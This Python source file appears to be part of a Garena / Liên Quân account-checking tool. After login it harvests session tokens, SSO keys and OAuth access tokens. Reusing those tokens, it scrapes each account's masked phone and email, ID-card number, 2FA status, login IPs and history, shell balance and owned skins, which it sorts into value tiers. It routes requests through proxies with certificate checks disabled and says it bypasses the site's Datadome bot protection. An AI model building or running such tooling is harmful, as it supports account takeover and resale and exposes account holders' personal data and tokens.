def _build_enc_frame(cmd: int, body: bytes, session_key: bytes) -> bytes:
    """Build a frame and encrypt payload with session_key (XTEA-CBC)."""
    hdr = (
        _pf_varint(1, PACKET_VERSION)   +
        _pf_varint(2, _next_id())       +
        _pf_varint(3, CMD_C2S_REQUEST)  +
        _pf_varint(4, cmd)              +
        _pf_varint(6, int(time.time()))
    )
    payload = struct.pack('>H', len(hdr)) + hdr + body
    enc_payload = xtea_encrypt(payload, session_key)
    return struct.pack('<I', len(enc_payload)) + enc_payload

def _recv_enc_frame(sock, session_key: bytes) -> tuple:
    """Receive and decrypt a session-encrypted frame."""
    size = struct.unpack('<I', _recvall(sock, 4))[0]
    enc_payload = _recvall(sock, size)
    payload = xtea_decrypt(enc_payload, session_key)
    hdr_len = struct.unpack('>H', payload[:2])[0]
    hdr  = _proto_decode(payload[2:2+hdr_len])
    body = payload[2+hdr_len:]
    return hdr, body

def _send_cmd(sock, cmd: int, body: bytes, session_key: bytes, max_tries: int = 5) -> tuple:
    """Send an encrypted command, skip spontaneous pushes, return matching response."""
    sock.sendall(_build_enc_frame(cmd, body, session_key))
    for _ in range(max_tries):
        hdr, resp_body = _recv_enc_frame(sock, session_key)
        resp_cmd = hdr.get(4, 0)
        if resp_cmd == cmd:
            return hdr, resp_body
        # Spontaneous push — skip and read next
    return {5: -1}, b''  # give up

# ── Post-login info fetchers ──────────────────────────────────────────────────
def _fetch_login_info(sock, session_key: bytes) -> dict:
    """CMD 276: region, shells, timestamps, FB UID, last-login IP."""
    try:
        hdr, body = _send_cmd(sock, CMD_LOGIN_INFO_GET, b'', session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(body)
        info = {}
        if 14 in fields:
            info['region'] = fields[14].decode('utf-8') if isinstance(fields[14], bytes) else str(fields[14])
        if 15 in fields:
            info['ccu'] = fields[15]
        # field[13]: shells balance (primary; field[1] value unverified — same for multiple accounts)
        if 13 in fields:
            acc = _proto_decode(fields[13]) if isinstance(fields[13], bytes) else {}
            if 1 in acc: info['shells'] = acc[1]
            if 2 in acc: info['topup_time'] = acc[2]
        # Timestamps — field[4]=account creation, field[5]=last login, field[2]=session expiry
        if 4 in fields: info['created_time'] = fields[4]      # account creation (~2019)
        if 5 in fields: info['last_login'] = fields[5]         # last login timestamp
        if 2 in fields: info['session_expiry'] = fields[2]     # token/session expiry (future)
        # field[17]: Facebook UID + link timestamp
        if 17 in fields:
            fb_proto = _proto_decode(fields[17]) if isinstance(fields[17], bytes) else {}
            if 1 in fb_proto:
                fb_uid_raw = fb_proto[1]
                info['fb_uid_login'] = fb_uid_raw.decode('utf-8') if isinstance(fb_uid_raw, bytes) else str(fb_uid_raw)
            if 2 in fb_proto:
                info['fb_link_time'] = fb_proto[2]
        # field[18]: last session info {1: unknown, 2: last_session_time, 3: {ip, country}}
        if 18 in fields:
            s18 = _proto_decode(fields[18]) if isinstance(fields[18], bytes) else {}
            if 2 in s18: info['last_session_time'] = s18[2]
            if 3 in s18:
                ip_proto = _proto_decode(s18[3]) if isinstance(s18[3], bytes) else {}
                if 2 in ip_proto:
                    ip_raw = ip_proto[2]
                    info['last_session_ip'] = ip_raw.decode('utf-8') if isinstance(ip_raw, bytes) else str(ip_raw)
                if 3 in ip_proto:
                    cc_raw = ip_proto[3]
                    info['last_session_country'] = cc_raw.decode('utf-8') if isinstance(cc_raw, bytes) else str(cc_raw)
        return info
    except Exception:
        return {}

def _fetch_user_basic(sock, uid: int, session_key: bytes) -> dict:
    """CMD 289: username, nickname, avatar_id."""
    try:
        user_entry = _pf_varint(1, 0) + _pf_varint(2, uid)  # version=0, uid
        body = _pf_bytes(1, user_entry)
        hdr, resp = _send_cmd(sock, CMD_USER_BASIC_INFO_LIST_GET, body, session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        if 1 not in fields:
            return {}
        user_data = _proto_decode(fields[1]) if isinstance(fields[1], bytes) else {}
        info = {}
        # tag1=version, tag2=uid, tag3=username, tag4=nickname, tag5=avatar_data
        if 2 in user_data:
            info['uid'] = user_data[2]
        if 3 in user_data:
            info['username'] = user_data[3].decode('utf-8') if isinstance(user_data[3], bytes) else str(user_data[3])
        if 4 in user_data:
            info['nickname'] = user_data[4].decode('utf-8') if isinstance(user_data[4], bytes) else str(user_data[4])
        return info
    except Exception:
        return {}

def _fetch_account_info(sock, session_key: bytes) -> dict:
    """CMD 342: password_secured, email_verified, account_secured, mobile_bound.
    Java protobuf: tag4=password_secured, tag5=email_verified, tag6=account_secured, tag7=mobile_bound."""
    try:
        hdr, body = _send_cmd(sock, CMD_USER_ACCOUNT_INFO_GET, b'', session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(body)
        info = {}
        if 4 in fields: info['password_set'] = bool(fields[4])
        if 5 in fields: info['email_verified'] = bool(fields[5])
        if 6 in fields: info['account_secured'] = bool(fields[6])
        if 7 in fields: info['mobile_bound'] = bool(fields[7])
        return info
    except Exception:
        return {}

def _fetch_sso_key(sock, session_key: bytes) -> dict:
    """CMD 442: SSO key for HTTP APIs."""
    try:
        hdr, body = _send_cmd(sock, CMD_SSO_KEY_GET, b'', session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(body)
        info = {}
        if 1 in fields:
            info['sso_key'] = fields[1].decode('utf-8') if isinstance(fields[1], bytes) else str(fields[1])
        if 2 in fields:
            info['expiry'] = fields[2]
        return info
    except Exception:
        return {}

def _fetch_session_token(sock, session_key: bytes, app_id: int = 0) -> dict:
    """CMD 278: session token for HTTP APIs (app_id=0 for system token)."""
    try:
        body = b'' if app_id == 0 else _pf_varint(1, app_id)
        hdr, resp = _send_cmd(sock, CMD_SESSION_TOKEN_GET, body, session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        info = {}
        if 1 in fields:
            info['session_token'] = fields[1].decode('utf-8') if isinstance(fields[1], bytes) else str(fields[1])
        if 2 in fields:
            info['expiry'] = fields[2]
        return info
    except Exception:
        return {}

def _fetch_recent_games(session_token: str, proxy=None) -> dict:
    """HTTP: recent played games from GameAppService."""
    if not HAS_REQUESTS or not session_token:
        return {}
    try:
        url = f"https://garenaapp.garenanow.com/api/user/get_recent_games?session_key={session_token}"
        resp = _requests.get(url, timeout=5, verify=False, proxies=_get_http_proxies(proxy))
        if resp.status_code == 200:
            data = resp.json()
            if 'error' not in data:
                return data
    except Exception:
        pass
    return {}

def _fetch_fb_info(sock, session_key: bytes) -> dict:
    """CMD 467: Check if Facebook is linked."""
    try:
        body = _pf_str(1, "")
        hdr, resp = _send_cmd(sock, CMD_FB_USER_INFO_GET, body, session_key)
        if hdr.get(5, 0) != 0:
            return {'fb_linked': False}
        fields = _proto_decode(resp)
        if 1 in fields:
            fb = _proto_decode(fields[1]) if isinstance(fields[1], bytes) else {}
            fb_uid = fb.get(4, 0)
            if fb_uid:
                return {'fb_linked': True, 'fb_uid': fb_uid}
        return {'fb_linked': False}
    except Exception:
        return {'fb_linked': False}

def _fetch_oauth_token(sock, session_key: bytes, app_id: int, response_type: int = 2) -> dict:
    """CMD 439: get OAuth token for a specific app. response_type: 1=CODE, 2=TOKEN."""
    try:
        body = (
            _pf_varint(1, app_id) +
            _pf_str(2, "") +
            _pf_varint(3, response_type) +
            _pf_str(4, "") +
            _pf_varint(5, 0) +
            _pf_varint(6, CLIENT_PLATFORM_ANDROID)
        )
        hdr, resp = _send_cmd(sock, CMD_APP_OAUTH_LOGIN, body, session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        info = {}
        if 1 in fields:
            info['access_token'] = fields[1].decode('utf-8') if isinstance(fields[1], bytes) else str(fields[1])
        if 4 in fields:
            info['open_id'] = fields[4].decode('utf-8') if isinstance(fields[4], bytes) else str(fields[4])
        return info
    except Exception:
        return {}

def _fetch_account_security(sso_key: str, proxy=None) -> dict:
    """Fetch masked phone, email, CCCD, authen from account.garena.com via SSO."""
    if not HAS_REQUESTS or not sso_key:
        return {}
    try:
        sess = _requests.Session()
        if proxy:
            sess.proxies = _get_http_proxies(proxy)
        # Step 1: Exchange sso_key for session cookies
        ua = "Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36"
        resp = sess.get(
            "https://sso.garena.com/api/universal/login",
            headers={"User-Agent": ua},
            params={
                "app_id": "10100",
                "sso_key": sso_key,
                "redirect_uri": "https://account.garena.com/",
            },
            verify=False, timeout=8, allow_redirects=False,
        )
        if resp.status_code != 200:
            return {}
        # Step 2: Fetch account init data
        resp2 = sess.get(
            "https://account.garena.com/api/account/init",
            headers={"User-Agent": ua},
            verify=False, timeout=8,
        )
        if resp2.status_code != 200:
            return {}
        data = resp2.json()
        if "error" in data:
            return {}
        ui = data.get("user_info", {})
        info = {}
        # Masked phone
        phone = ui.get("mobile_no", "")
        cc = ui.get("country_code", "")
        if phone and phone.replace("*", ""):
            info["masked_phone"] = f"+{cc} {phone}" if cc else phone
        else:
            info["masked_phone"] = ""
        # Masked email
        info["masked_email"] = ui.get("email", "")
        info["email_v"] = ui.get("email_v", 0)
        # CCCD / ID card
        info["idcard"] = ui.get("idcard", "")
        # Authen / 2FA
        info["authenticator_enable"] = ui.get("authenticator_enable", 0)
        info["two_step_verify"] = ui.get("two_step_verify_enable", 0)
        # FB from account init
        info["fb_connected"] = bool(ui.get("is_fbconnect_enabled"))
        info["fb_account"] = ui.get("fb_account")
        info["acc_country"] = ui.get("acc_country") or ""
        info["country"] = ui.get("country") or ""
        info["country_code"] = ui.get("country_code") or ""
        info["suspicious"] = 1 if ui.get("suspicious") else 0
        info["init_ip"] = data.get("init_ip", "")
        # Login history – last 5 entries (field: timestamp, source, ip, country)
        raw_hist = data.get("login_history") or []
        hist = []
        for h in raw_hist[:5]:
            ts = int(h.get("timestamp", 0) or h.get("login_time", 0) or 0)
            dt_str = _dt.datetime.fromtimestamp(ts).strftime('%d-%m-%Y %H:%M') if ts else ''
            hist.append({
                "ip":      h.get("ip", ""),
                "country": h.get("country", ""),
                "game":    h.get("source", "") or h.get("game_name", "") or h.get("app_name", ""),
                "time":    dt_str,
            })
        info["login_history"] = hist
        # Sensitive operations – last 5 entries (field: timestamp, operation, ip, country)
        raw_ops = data.get("sensitive_operation") or []
        ops = []
        for op in raw_ops[:5]:
            ts = int(op.get("timestamp", 0) or op.get("operation_time", 0) or op.get("op_time", 0) or 0)
            dt_str = _dt.datetime.fromtimestamp(ts).strftime('%d-%m-%Y %H:%M') if ts else ''
            ops.append({
                "type": op.get("operation", "") or op.get("operation_type", "") or op.get("op_type", ""),
                "ip":   op.get("ip", ""),
                "time": dt_str,
            })
        info["sensitive_ops"] = ops
        return info
    except Exception:
        return {}

def _fetch_uac_country(sso_key: str, proxy=None) -> str:
    """Fetch UAC country code from shop.garena.sg using sso_key, bypassing Datadome block."""
    if not HAS_REQUESTS or not sso_key:
        return ""
    try:
        import time
        sess = _requests.Session()
        if proxy:
            sess.proxies = _get_http_proxies(proxy)
        sess.cookies.set('sso_key', sso_key)
        token_url = "https://authgop.garena.com/oauth/token/grant"
        token_headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        token_data = f"client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}"
        token_resp = sess.post(token_url, headers=token_headers, data=token_data, timeout=5, verify=False)
        access_token = token_resp.json().get('access_token')
        if access_token:
            inspect_url = "https://shop.garena.sg/api/auth/inspect_token"
            inspect_resp = sess.post(inspect_url, json={'token': access_token}, timeout=5, verify=False)
            uac = inspect_resp.json().get('uac')
            if uac:
                return str(uac).strip().upper()
    except Exception:
        pass
    return ""

# ── Liên Quân skin ID classification ──────────────────────────────────────────
SKIN_SS = {
    '10705': 'Zephys Siêu việt', '10801': 'Gildur Tiệc Bãi Biển',
    "13316": "Valhein Mã Hành Vạn Lý", "14120": "Lauriel Mã Đằng Cửu Thế",
    '10912': 'Veera A.I Love you', '10915': 'Veera Thất Sát - Thượng Sinh',
    '11110': 'Violet Vợ người ta', '11113': 'Violet Huyết Ma Thần',
    '11115': 'Violet Thần long tỷ tỷ', '11202': 'Yorn Thế Tử Nguyệt Tộc',
    '11205': 'Yorn Long thần soái', '11212': 'Yorn Vệ Binh ngân hà',
    '11604': 'Butterfly Nữ Quái Nổi Loạn', '11614': 'Butterfly Kim ngư thần nữ',
    '11616': 'Butterfly Thánh nữ khởi nguyên', '11619': 'Butterfly Rockgirl Siêu Đẳng',
    '11808': 'Alice Quân Nhạc Athanor', '12008': 'Mina Linh Xà yêu vũ',
    '12304': 'Maloch Đại Tướng Robot', '12606': 'Arduin Bạch vệ chiến giáp',
    '12608': 'Arduin Ngạo Hổ Hàn Đao', '12801': 'Lữ Bố Tiệc Bãi Biển',
    '12806': 'Lữ Bố Tư lệnh Robot', '12812': 'Lữ Bố Cửu Thiên Lôi Thần',
    '12907': 'Triệu Vân Kỵ sĩ tận thế', '13005': 'Airi Kiemono',
    '13006': 'Airi Bạch Kiemono', '13104': 'Murad Siêu việt',
    '13108': 'Murad Siêu việt 2.0', '13109': 'Murad Chí tôn thần kiếm',
    '13204': 'Hayate Tử thần vũ trụ', '13212': 'Hayate Thống Soái Dạ Ưng',
    '13302': 'Valhein Vũ khí tối thượng', '13313': 'Valhein Đệ nhất thần thám',
    '13609': 'Ilumia Khải Huyền Thiên Hậu', '13612': 'Ilumia Nộ hải Thiên ngư',
    '13705': 'Paine Tử xà Bá tước', '14104': 'Lauriel Thánh quang sứ',
    '14107': 'Lauriel Tinh vân sứ', '14109': 'Lauriel thiên sứ công nghệ',
    '14110': 'Lauriel Phi thiên', '14117': 'Lauriel Vũ khúc miêu ảnh',
    '14118': 'Lauriel Thiên nữ Dạ Ưng', '14206': 'Natalya Nghiệp Hoả Yêu Hậu',
    '14404': 'Taara Tiệc bãi biển', '15007': 'Nakroth Lôi Quang Sứ',
    '15202': 'Điêu Thuyền Tiệc bãi biển', '15204': 'Điêu Thuyền WaVe',
    '15211': 'Điêu Thuyền Thất Tịch Tiên Tử', '15409': 'Yena WaVe',
    '15413': 'Yena Trấn Yêu Thần Lộc', '15611': 'Aleister HLV bất bại',
    '15704': 'Raz Chiến thần Muay Thái', '15705': 'Raz Siêu việt',
    '16607': 'Arthur Siêu Việt', '16703': 'Ngộ Không Siêu việt',
    '16705': 'Ngộ Không Siêu việt 2.0', '16710': 'Ngộ Không Tân niên Võ Thần',
    '16711': 'Ngộ Không Thần Giáp Xích Diễm', '16712': 'Ngộ Không Tề Thiên Võ Thánh',
    '17106': 'Cresht Bách Tướng Lão Tam', '17309': 'Fennik Phong Tranh Thám Xuân',
    '18408': 'Helen Bé Hoa Xuân', '18702': 'Arum Vũ khúc long hổ',
    '18704': 'Arum Vũ khúc thần sứ', '19002': 'Tulen Tân Thần Thiên Hà',
    '19006': 'Tulen Tân thần hoàng kim', '19012': 'Tulen Tân niên vệ thần',
    '19013': 'Tulen Tiêu Dao Vũ Thần', '19509': 'Enzo Sát thần Bạch Hổ',
    '19605': 'Elsu Sứ giả tận thế', '19609': 'Elsu Trấn thiên phi hồ',
    '50111': "Tel'Annas Vũ khúc yêu hồ", '50117': "Tel'Annas Thiên Vũ Thần Long",
    '50604': 'Omen Đao phủ tận thế', '51003': 'Liliana Nguyệt mị ly',
    '51004': 'Liliana Tiểu thơ anh đào', '51005': 'Liliana Tân nguyệt mị ly',
    '51009': 'Liliana WaVe', '51013': 'Liliana Lưu Thủy Thần Long',
    '51208': 'Rourke Bách Tướng Lão Đại', '51306': 'Zata Chí tôn Tà Phượng',
    '51808': 'Quillen Nghịch thiên long đế', '52007': 'Veres Kimono',
    '52404': 'Capheny Kimono', '52709': 'Sephera Bách nhạn ngân linh',
    '53304': 'Laville Xạ Thần Tinh Vệ', '53309': 'Laville Vệ binh giáng sinh',
    '53503': 'Sinestrea Wave', '53703': 'Allain Tuyết sơn song kiếm',
    '54802': 'Bijan Hoàng kim cơ giáp', '56703': 'Erin Tình yêu cổ tích',
    '59901': 'Billow Thiên Tướng - Độ Ách',
    '10603': 'Krixi Tiệc Bãi Biển', '51504': 'Richter Kiếm thần Susanoo',
    # --- new ---
    '10714': 'Zephys Kỷ Nguyên Hổ Phách',
    '10916': "Veera My Melody's Love", '11105': 'Violet Tiệc bãi biển',
    '14213': 'Natalya Nguyệt Ảnh Kiếm Tiên', '14214': "Natalya Kuromi's Heart",
    '15216': 'Điêu Thuyền Tuế Hàn Đỗ Quyên', '16304': 'Ryoma Samurai huyền thoại',
    '16311': 'Ryoma Maple Frost', '17408': 'Stuart Siêu Trùm phản diện',
    '19109': 'Rouie Lữ hành Thời không', '20601': 'Charlotte Hexsword',
    '52108': 'Florentino Bá vương Âm nhạc', '52113': 'Florentino Kỷ Nguyên Hổ Phách',
    '52710': 'Sephera Nova Stardust', '53701': 'Allain Hắc kiếm sĩ Kirito',
    '54507': 'Yue Hỗn Độn Thần Ma', '54805': 'Bijan Lữ Hành Thời Không',
    '56704': 'Erin Huyễn Ảnh Mị Điệp', '59802': 'Bolt Baron Thiên Phủ',
    # --- new ---
    '50120': "Tel'annas Kỷ Nguyên Hổ Phách", '59902': 'Billow T-Rex Bất Bại',
    '15903': 'Dolia Nhật Ký Tình Yêu', '15905': 'Dolia Mã Khởi Thiên Ca',
    '51814': 'Quillen Thẩm phán Trăng khuyết', '52908': 'Volkath Ma Ảnh Thần Đao',
    '56301': 'Heino Nhật Ký Tình Yêu', '50121': "Tel'annas Tiệc bãi biển",
    '15217': 'Điêu Thuyền Nhật Nguyệt Thánh Linh', '19016': 'Tulen Thiên Cơ Bạch Trạch',
    '53612': 'Aoi Mikasa', '53611': 'Aoi Bách thú triều Long',
    '53513': 'Sinestrea Định Vị Tuyệt Đối', '54607': 'Teeri Vân Y Cẩm Tú',
    '54806': 'Bijan Giai điệu Giáng Sinh', '11215': 'Yorn Conan Edogawa',
    '16612': 'Arthur Pompompurin Oath', '12913': 'Triệu Vân Chiến Thần Vô Song',
    '53311': 'Laville Thợ Săn Truy Ảnh', '52014': 'Veres Idol Giáng Sinh',
}

SKIN_SSS = {
    '10620': 'Krixi Phù thủy thời không', '11107': 'Violet Thứ nguyên vệ thần',
    '11119': 'Violet Vọng nguyệt Long Cơ', '11607': 'Butterfly Phượng Cửu Thiên',
    '12912': 'Triệu Vân Minh Chung Long Đế', '13011': 'Airi Bích hải thánh nữ',
    '13015': 'Airi Thứ nguyên Vệ thần',
    '13116': 'Murad Tuyệt thế thần binh', '13118': 'Murad Thánh Luân Kiếm Thánh',
    '13210': 'Hayate Tu Di Thánh Đế', '14111': 'Lauriel Thứ nguyên vệ thần',
    '15009': 'Nakroth thứ nguyên vệ thần', '15013': 'Nakroth Quỷ thương liệp đế',
    '15015': 'Nakroth Bạch diện chiến thương', '15412': 'Yena Huyền cửu thiên',
    '15710': 'Raz Bão vũ Cuồng lôi', '19007': 'Tulen Chí tôn kiếm tiên',
    '19009': 'Tulen Thần sứ ST.L-79', '50105': "Tel'Annas Thần sứ F.E.E-X1",
    '50108': "Tel'Annas Thứ nguyên vệ thần", '50112': "Tel'Annas Tân niên vệ thần",
    '50119': "Tel'Annas Lân Quang Thánh Diệu", '52011': 'Veres Lưu ly Long mẫu',
    '52414': 'Capheny Càn Nguyên Điện Chủ', '54307': 'Aya Công chúa cầu vồng',
    '54804': 'Bijan Kình thiên Long Kỵ',
    # --- new (59702 moved to ANIME) ---
    '13314': 'Valhein Thứ nguyên vệ thần', '13613': 'Ilumia Lưỡng Nghi Long Hậu',
    "19908": "Eland'orr Mộng Giới Thần Chủ", '51015': 'Liliana Ma Pháp Tối Thượng',
}

SKIN_ANIME = {
    '10611': 'Krixi Anime', '10709': 'Zephys Inosuke Hashibira',
    '10914': 'Veera Phù thủy Hội họa', '11120': 'Violet Nobara Kugisaki',
    '11610': 'Butterfly Asuna Tia chớp', '11611': 'Butterfly Stacia',
    '11810': 'Alice Phi hành gia', '11812': 'Alice - Eternal Sailor Chibi Moon',
    '12808': 'Lữ Bố Ichigo Kurosaki', '13111': 'Murad Byakuya Kuchiki',
    '13112': 'Murad Zenitsu Agatsuma', '13706': 'Paine Megumi Fushiguro',
    '15012': 'Nakroth Killua', '15212': 'Eternal Sailor Moon',
    '15304': 'Kaine Chiến Binh Kim Quang', '15707': 'Raz Saitama Cosplay',
    '15711': 'Raz Gon', '16307': 'Ryoma Ultraman',
    '16310': 'Ryoma Ailing Samurai', '16311': 'Ryoma Maple Frost',
    '16707': 'Ngộ Không Nhóc tỳ bá đạo', '16909': 'Slimz Siêu Cấp Tối Thượng',
    '17405': 'Stuart Đạo tặc tử quang', '17706': 'Lindis Đồng phục Shihakusho',
    '19015': 'Tulen Satoru Gojo', '19508': 'Enzo Kurapika',
    '19906': "Eland'orr-Tuxedo", '50118': "Tel'Annas Jujutsu Sorcerer",
    '51305': 'Zata Tác gia đương đại', '51907': 'Annette Nữ sinh trung học',
    '52105': 'Florentino SEVEN', '52110': 'Florentino Hisoka',
    '52204': 'Errol Genos', '52710': 'Sephera NoVa Stardust',
    '53107': 'Keera Nezuko Kamado', '53701': 'Allain Kirito Hắc kiếm sĩ',
    '53702': 'Allain Kirito', '54002': 'Bright Toshiro Hitsugaya',
    '54402': 'Yan Tanjiro Kamado',
    # --- new ---
    '13213': 'Hayate Siêu đạo chích Kid', '18906': 'Krizzix Cursed Corpse',
    '19506': 'Enzo Sát quỷ đoàn', '52008': 'Veres Phù thủy trang điểm',
    '52407': 'Capheny Harley Quinn', '52415': 'Capheny Bugcag Assemble',
    '52809': 'Qi Milim Nava', '53308': 'Laville Chiến thần MOBA',
    '53806': 'Iggy Rimuru Tempest', '54309': "Aya Cinnamoroll's Dream",
    '59702': 'Biron Yuji Itadori',
    # --- new ---
    '52810': 'Qi Annie Leonhart', '53612': 'Aoi Mikasa',
    '17108': 'Cresht Eren Jaegar', '15016': 'Nakroth Levi',
    '14412': 'Taara Shion', '11215': 'Yorn Conan Edogawa',
    '10916': "Veera My Melody's Love", '14214': "Natalya Kuromi's Heart",
    '16612': "Arthur Pompompurin's Oath",
}

SKIN_OTHER = {
    '10605': 'Krixi Đêm Noel', '10804': 'Gildur Phán Quan',
    '11103': 'Violet Đặc Vụ Tinh Nhuệ', '11111': 'Violet Điệp Vụ Thần Tốc',
    '11606': 'Butterfly Tuyết Nhung Xà', '12802': 'Lữ Bố Cận chiến Robot',
    '12906': 'Triệu Vân Thần tài', '13104': 'Murad Siêu việt',
    '13302': 'Valhein Vũ khí tối thượng', '13314': 'Valhein Xạ thần Kagutsuchi',
    '15003': 'Nakroth Siêu việt', '16703': 'Ngộ Không Siêu việt',
    '16705': 'Ngộ Không Siêu việt 2.0', '16607': 'Arthur Siêu Việt',
    '15705': 'Raz Siêu việt', '15704': 'Raz Chiến thần Muay Thái',
    '19002': 'Tulen Tân Thần Thiên Hà', '19006': 'Tulen Tân thần hoàng kim',
    '10705': 'Zephys Siêu việt',
}

def _classify_skins(owned_ids: list) -> dict:
    """Classify owned skin IDs into SS/SSS/ANIME/OTHER tiers and count unique champions."""
    ss_list, sss_list, anime_list, other_list = [], [], [], []
    prefixes = set()
    for item_id in owned_ids:
        sid = str(item_id)
        matched = False
        if sid in SKIN_SS:    ss_list.append(SKIN_SS[sid]); matched = True
        if sid in SKIN_SSS:   sss_list.append(SKIN_SSS[sid]); matched = True
        if sid in SKIN_ANIME: anime_list.append(SKIN_ANIME[sid]); matched = True
        if not matched and sid in SKIN_OTHER: other_list.append(SKIN_OTHER[sid])
        prefix = sid[:3]
        prefixes.add(prefix)
    return {
        'total_skins': len(owned_ids),
        'total_champs': len(prefixes),
        'ss': len(ss_list), 'ss_list': ss_list,
        'sss': len(sss_list), 'sss_list': sss_list,
        'anime': len(anime_list), 'anime_list': anime_list,
        'other': len(other_list), 'other_list': other_list,
    }

def _get_app_redirect_url(sock, session_key: bytes, redirect_uri: str) -> str:
    """Use CMD_APP_OAUTH_LOGIN with redirect_uri to obtain a ?code=... login URL."""
    try:
        body = (
            _pf_varint(1, LIEN_QUAN_APP_ID) +
            _pf_str(2, redirect_uri) +
            _pf_varint(3, 1) +
            _pf_str(4, "") +
            _pf_varint(5, 0) +
            _pf_varint(6, CLIENT_PLATFORM_ANDROID)
        )
        hdr, resp = _send_cmd(sock, CMD_APP_OAUTH_LOGIN, body, session_key)
        if hdr.get(5, 0) != 0:
            return ''
        fields = _proto_decode(resp)
        url = fields.get(2, b'')
        return url.decode('utf-8') if isinstance(url, bytes) else str(url)
    except Exception:
        return ''


def _fetch_sale_skins(redirect_url: str, proxy=None) -> dict:
    """Use pre-computed ?code=... redirect URL to authenticate with sale.lienquan.garena.vn."""
    if not HAS_REQUESTS or not redirect_url:
        return {}
    try:
        sess = _requests.Session()
        if proxy:
            sess.proxies = _get_http_proxies(proxy)
        sess.get(redirect_url, allow_redirects=False, verify=False, timeout=6)
        if not sess.cookies:
            return {}
        gql = {
            "operationName": "getUser",
            "variables": {},
            "query": "query getUser { getUser { id name profile { ownedItemIdList cp } } }"
        }
        resp = sess.post("https://sale.lienquan.garena.vn/graphql", json=gql, verify=False, timeout=6)
        result = {}
        if resp.status_code == 200:
            user = (resp.json().get('data') or {}).get('getUser')
            if user:
                profile = user.get('profile') or {}
                owned = profile.get('ownedItemIdList') or []
                result = _classify_skins(owned)
                result['cp'] = profile.get('cp', 0)
        try:
            gql_hist = {"query": "{ getItemHistory(limit: 20) { id source extra costStr createdAt itemList } }"}
            rh = sess.post("https://sale.lienquan.garena.vn/graphql", json=gql_hist, verify=False, timeout=6)
            if rh.status_code == 200:
                hist = (rh.json().get('data') or {}).get('getItemHistory') or []
                if hist:
                    result['item_history'] = hist
        except Exception:
            pass
        return result
    except Exception:
        pass
    return {}

# Bảng map AOV rank_id -> số sao Cao Thủ
# Dựa trên rank_config thực tế từ weeklyreport API
# Key = rank_id (int), Value = stars (1-5)
_AOV_MASTER_STARS: dict = {
    # Các giá trị phổ biến gặp trong thực tế — bổ sung thêm khi cần
    # Format: rank_id: stars
    # Nhóm Cao Thủ (Master) — thường là 10 rank liên tiếp (2 ID/sao)
    # Sẽ được populate động từ rank_config nếu có field 'stars'/'level'
}

def _fetch_weekly_profile(access_token: str, proxy=None) -> dict:
    """weeklyreport.moba.garena.vn: player name, rank, rank_id, stars."""
    if not HAS_REQUESTS or not access_token:
        return {}
    try:
        ua = "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Mobile Safari/537.36"
        headers = {'Access-Token': access_token, 'Partition': '1011', 'User-Agent': ua}
        resp = _requests.get("https://weeklyreport.moba.garena.vn/api/profile",
                             headers=headers, verify=False, timeout=5,
                             proxies=_get_http_proxies(proxy))
        if resp.status_code == 200:
            data = resp.json()
            pi = data.get('player_info', {})
            rank_cfg = data.get('rank_config', {})
            rank_name = ''
            rid = pi.get('rank')
            rank_entry = {}
            stars = 0
            
            # 1. Thử lấy số sao trực tiếp từ player_info trước
            for f in ('star', 'stars', 'rankStar', 'rank_stars', 'level', 'rankLevel'):
                sv = pi.get(f)
                if sv is not None:
                    try:
                        n = int(sv)
                        if n > 0:
                            stars = n
                            break
                    except (ValueError, TypeError):
                        pass

            if rid is not None and str(rid) in rank_cfg:
                rank_entry = rank_cfg[str(rid)] or {}
                rank_name = rank_entry.get('name', '')
                # 2. Thử lấy số sao từ các field phổ biến trong rank_config nếu ở trên chưa có
                if not stars:
                    for field in ('stars', 'star', 'level', 'sub_rank', 'tier_level',
                                  'rank_level', 'sub_level', 'division', 'star_count'):
                        v = rank_entry.get(field)
                        if v is not None:
                            try:
                                n = int(v)
                                if 1 <= n <= 50:   # Cao Thủ có tới 50 sao
                                    stars = n
                                    break
                            except (ValueError, TypeError):
                                pass
            # Dùng bảng map nếu chưa có
            if not stars and rid is not None:
                stars = _AOV_MASTER_STARS.get(int(rid), 0)
            # Kéo số sao từ bảng rank_config nếu có
            if not stars and rid is not None:
                pass # Chờ lấy từ kientuong nếu không có trong weeklyreport
            return {
                'name': pi.get('name', ''),
                'rank': rank_name or (str(rid) if rid else ''),
                'rank_id': rid,
                'rank_stars': stars,
                'rank_entry': rank_entry,  # full config entry để debug
            }
    except Exception:
        pass
    return {}

def _fetch_rov_th_via_termgame(sso_key: str, proxy=None) -> dict:
    """Fetch RoV Thailand role/shells via termgame.com (the official TH top-up site).

    Flow:
      1. authgop.garena.com/oauth/token/grant with client_id=10017 → termgame.com/app/
      2. termgame.com/api/auth/inspect_token → termgame session_key cookie
      3. termgame.com/api/auth/get_user_info/multi → shell_balance, uac (country)
      4. termgame.com/api/shop/apps/roles?app_id=100055&region=IN.TH → RoV TH role info

    Returns dict with: shells, uac, rov_role_name, rov_role_id, rov_server,
    rov_server_id, rov_packed_role_id, rov_open_id, has_rov_role.
    Note: termgame.com is a top-up shop — no skin/inventory endpoint exists.
    """
    if not HAS_REQUESTS or not sso_key:
        return {}

    def _try_shop_site(base_url: str) -> dict:
        """Try one top-up shop site (termgame.com or napthe.vn). Returns dict or {}."""
        try:
            from urllib.parse import quote_plus as _qp
            sess = _requests.Session(); sess.verify = False
            if proxy: sess.proxies = _get_http_proxies(proxy)
            sess.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36'})
            # Step 1: grant via authgop
